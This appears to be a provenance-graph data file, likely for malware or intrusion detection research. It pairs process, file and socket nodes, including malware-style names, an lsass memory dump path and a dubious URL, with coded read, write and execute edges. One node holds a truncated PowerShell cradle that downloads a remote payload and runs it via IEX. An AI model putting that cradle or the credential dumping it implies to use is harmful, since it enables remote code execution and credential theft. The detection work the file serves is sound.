61
MP-MicrosoftEdgeUpdate.exe
SF-C:\Users\admin\AppData\Local\Temp\is-I2CKA.tmp
TP-vlc.exe 
TF-C:\Users\admin\AppData\Local\Temp\444444.png
TP-k2141323.exe
MF-C:\Users\admin\AppData\Local\Temp\468C
MF-96.zip
MP-444444.png.png.exe 
MP-MMFbbhOyNS.exe
TP-tshark.exe
MF-\Windows\debug\WIA\wininit.exe
TP-net1.exe
SO-file://C:\windows\system32\notepad.exe
MP-7za.exe
MF-C:\Windows\Temp\lsass_dump.dmp
TF-C:\Users\admin\AppData\Local\Temp\reviewref_protected
SF-C:\Users\admin\AppData\Local\Temp\putty
MF-\windows\system32\calc.exe
MF-.\T1218.007\bin\T1218.007_DLL.m
SO-127.0.0.1
TP-goose_goose_duck_free.exe 
SO-https://gmail.us21.list-manage.com/track/click?u=c5edbce8886c368c0f6288564&id=20a3994999&e=e4fa9352f9
TP*-DllHost.exe 
MP-pestudio.exe 
MP-sdiagnhost.exe
TP-Redline Activate.exe 
MP*-X_Net_Windows.exe
TF-\Windows\System32\rundll32.exe
SO-https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/CreateProcess/Get-CreateProcessSystemBind.ps1
MF-files\29630.ico
MP-IrSatorLauncher.exe 
MF-EXa1276.12704\MadInjector\MadInjector.exe
TP*-fast1nject.exe 
MP-DIXRAT.exe 
TP-certreq.exe
MP*-qwinsta.exe
TP-n4054738.exe
TF-C:\Users\admin\AppData\Local\Temp\b
MF-\Users\admin\AppData\Local\Temp\skmt-bankinter-003-03588993232059560257100458.jar
MP-cmd.exe 
TP-Scanned_file_PO23_Jan.exe 
MF-\Windows\system32\shell32.dll
MF-files\8527.ico.txt
SO-https://raw.githubusercontent.com/redcanaryco/atomic-red-team/4042cb3433bce024e304500dcfe3c5590571573a/LICENSE.txt
TP-RdrCEF.exe
TP-some_malicious_file.bin.exe
TP-server.exe 
MP-svchost.exe
TP-rundll32.exe
TP-SecuriteInfo.com
MP-LZ4-SOFT.exe 
MF-PathToAtomicsFolder\T1546.003\src\T1546.003.m
SO-http://fbi.fund/dark.exe
SF-C:\Users\admin\AppData\Local\Temp\nsf91FB
SO-https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/CradleTest.txt','Default_File_Path.ps1');IEX((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_
MF-\Users\admin\AppData\Local\Temp\Saz_Injector.zip
MP-Invoice.exe 
SF-C:\Users\admin\Desktop\Attachment_94259849.zip
SF-C:\Program Files\Microsoft Office\Office14\ONENOTE
44 37 RD-4
44 38 RD-4
44 41 EX-4
44 42 UK-4
45 37 WR-4
45 38 WR-4
45 41 WR-4
43 45 RF-4
46 37 RD-4
46 38 RD-4
46 41 WR-4
46 43 ST-4
45 46 UK-4
47 37 WR-4
47 38 EX-4
47 41 WR-4
47 43 ST-4
48 38 RD-4
48 41 RD-4
48 43 ST-4
47 48 UK-4
49 41 UK-4
43 50 RF-4
50 51 RD-4
52 50 RF-4
50 53 WR-4
54 50 RF-4
50 55 WR-4
50 56 FR-4
56 51 CD-4
52 56 RF-4
56 53 RD-4
56 54 ST-4
56 55 EX-4
50 57 UK-4
56 58 WR-4
56 59 ST-4
60 51 RD-4
60 52 ST-4
60 53 RD-4
54 60 RF-4
60 55 RD-4
56 60 UK-4

